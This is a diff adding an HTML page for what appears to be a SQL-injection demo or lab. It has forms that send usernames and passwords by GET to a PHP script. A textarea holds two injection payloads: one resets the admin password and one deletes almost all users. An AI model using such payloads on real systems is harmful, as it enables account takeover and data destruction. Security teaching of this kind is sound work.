@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>SQL Injection</title>
+</head>
+<body>
+<h2>SQL-Injection</h2>
+<form action="SQLI.php" method="get">
+    <h2>Add User</h2>
+    <label for="username">Username</label><input id="username" name="username">
+    <label for="password">Password</label><input id="password" name="password">
+    <input name="action" value="add" style="display: none">
+    <input type="submit">
+</form>
+
+<form action="SQLI.php" method="get">
+    <h2>Login</h2>
+    <label for="username1">Username</label><input id="username1" name="username">
+    <label for="password1">Password</label><input id="password1" name="password">
+    <input name="action" value="login" style="display: none">
+    <input type="submit">
+</form>
+<br/>
+<form action="SQLI.php" method="get">
+    <h2>Show all users</h2>
+    <input name="action" value="all" style="display: none">
+    <input type="submit">
+</form>
+<br/>
+<br/>
+<br/>
+<br/>
+<textarea style="width: 100%; height: 500px">
+123 ") ; UPDATE  users SET password = "foo" WHERE (username = "admin
+
+
+123 ") ; DELETE FROM users WHERE (username != "
+</textarea>
+</body>
+</html>
